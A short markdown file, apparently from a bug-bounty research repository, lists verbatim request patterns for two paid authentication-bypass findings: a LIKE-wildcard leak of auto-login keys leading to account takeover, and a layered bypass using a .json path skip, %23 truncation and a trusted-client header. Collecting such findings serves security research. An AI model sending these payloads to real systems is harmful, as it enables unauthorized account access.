# Payloads — auth-bypass

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Unauthenticated account takeover via LIKE-wildcard leak of auto-login keys ($5,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2117981403161764138
- Sources: `posts/infinitelogins/2026-11-04-2117981403161764138.md`

```
GET /autologin/lookup?key=% ; POST /autologin/resolve?key=% with {user_id,tenant_id} ; POST /autologin/devices with {user_id,key}
```

## 2. Layered auth bypass: .json static-path skip + %23 truncate + trusted-client header ($10,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2108181015885685018
- Sources: `posts/infinitelogins/2026-10-08-2108181015885685018.md`

```
GET /api/employee/12345%23.json with header X-CLIENT-ID: WEBAPP
```
